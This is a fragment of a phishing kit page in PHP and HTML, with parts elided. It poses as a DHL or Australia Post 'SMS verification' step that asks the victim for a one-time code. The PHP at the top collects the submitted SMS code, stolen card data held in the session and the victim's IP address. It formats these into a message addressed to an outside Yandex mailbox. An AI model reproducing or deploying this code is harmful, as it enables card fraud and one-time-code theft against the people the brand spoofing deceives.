...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (is_numeric($_POST['sms'])) {
		  ...
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            ...
            $message = "😪M4X1M1L1AN0😪 CC (1) :" . $_SESSION['cc'] . "\nCodeSMS :" . $_POST['sms'] ."\n" . $ip . "\n*****************************\n";
			$sms = $_POST['sms'];
			$to = "mrh4x3r@yandex.com";
			$subject = "[AU] | CC (1) SMS (1) : $ip ---> $sms";
			$headers = "From:SMS <web>\r\n";
...
<head id="Head1">
    ...
    <link id="Link1" rel="shortcut icon"
          href="img/dhl.gif">
    <link id="Link2" rel="icon" href="img/dhl.gif"
          type="image/ico">
    <script language="javascript" type="text/javascript"
            ...
            <div id="cabecera" class="container ogilvy-bg-amarillo">
                <div class="row">
                    <div class="col-xs-12 text-center ogilvy-header">
                        <img src="https://cdn.shopify.com/s/files/1/0119/5868/1681/files/AP-logo-trans_4049x.png?v=1573800355" id="logoCorreos"
                        ...
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                            ...
                                            <span id="fecha" class="descripcionPago"
                                                  style="font-weight:bold;">DATE </span><span id="Fechavalor"
                                                                                               style="font-weight:normal;"><?php echo date('d/m/Y H:i:s'); ?></span>
                                        </div>
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">SMS verification </span><br><span
                                                    id="conceptovalor" style="font-weight:normal;">You will receive an SMS code to validate the operation, enter the code and press validate . </span>
                                        </div>
                                    </div>
                                ...
                                <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">
                                    ...
                                    <span id="lbSubTittle" class="subtitulo">AU63 **** 726</span><br>
                        ...
                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 ogilvy-seleccionpago ogilvy-espacioseccion">
                            <div class="col-xs-12">
                                <div class="ogilvy-botonrelleno ogilvy-Sweep">
                                    <input type="submit" name="bSiguiente" value="Validate" id="bSiguiente" class="bSiguiente">
